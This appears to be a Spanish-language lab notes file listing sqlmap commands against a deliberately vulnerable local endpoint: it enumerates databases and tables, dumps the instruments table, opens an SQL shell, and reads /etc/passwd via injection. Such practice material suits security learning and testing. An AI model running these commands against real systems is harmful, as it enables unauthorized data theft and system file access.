# sqlmap


# Usar ID que existe (16)
sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinst?id=16" \
  --batch \
  --dbs \
  --dbms=postgresql

# O con el otro endpoint vulnerable
sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinsturlparam?id=16" \
  --batch \
  --dbs \
  --dbms=postgresql


1. Enumerar tablas del schema public:

sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinst?id=16" \
  --batch \
  -D public \
  --tables \
  --dbms=postgresql

2. Ver columnas de la tabla instruments:

sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinst?id=16" \
  --batch \
  -D public \
  -T instruments \
  --columns \
  --dbms=postgresql


3. Extraer todos los datos:

sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinst?id=16" \
  --batch \
  -D public \
  -T instruments \
  --dump \
  --dbms=postgresql


4. Obtener un shell SQL interactivo:

sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinst?id=16" \
  --batch \
  --sql-shell \
  --dbms=postgresql


5. Intentar escalar privilegios (leer archivos del sistema):

sqlmap -u "http://localhost:8080/instruments/vulnerable-sqligetinst?id=16" \
  --batch \
  --file-read="/etc/passwd" \
  --dbms=postgresql



